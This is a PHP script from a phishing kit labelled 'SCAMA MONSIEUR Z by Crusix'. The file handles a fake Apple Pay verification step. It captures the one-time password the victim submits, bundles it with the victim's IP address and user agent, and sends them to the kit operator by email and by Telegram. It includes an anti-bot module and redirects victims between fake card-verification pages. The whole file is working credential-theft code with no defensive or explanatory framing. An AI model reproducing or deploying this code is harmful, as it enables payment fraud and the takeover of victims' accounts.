<?php
/*
SCAMA MONSIEUR Z
BY CRUSIX
GET_APPLEPAY.PHP
*/
include('../ANTIBOTS/antibots.php');
include('../mail.php');
include '../telegram.php';

if(isset($_POST['codeotp'])){

$_SESSION['otp'] = $_POST['codeotp'];

if(!empty($_SESSION['otp']) && strlen($_SESSION['otp']) >= 6)
	 {
$msg = "
🔒 OTP : ".$_SESSION['otp']."


🎪 IP Adress : ".$_SESSION['ip']."
🌐 User Agent : ".$_SESSION['useragent']."
";

$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=94=92=E3=80=8D_-_APPLE_PAY_-?= ".$_SESSION['otp']." - ".$_SESSION['ip'];
$fromsender = "From: =?utf-8?Q?=F0=9F=94=B4MONSIEUR_Z=F0=9F=94=B4?= <log@crusxlebg.com>";
mail($rezmail,$subject,$msg,$fromsender);
	telegram($msg);
$_SESSION['finished'] = true;
header('Location: finished.php?'.uniqid());

}
else{
	header('Location: vbv_01.php?error=true');
}


}

else{
die('ERROR');
}

?>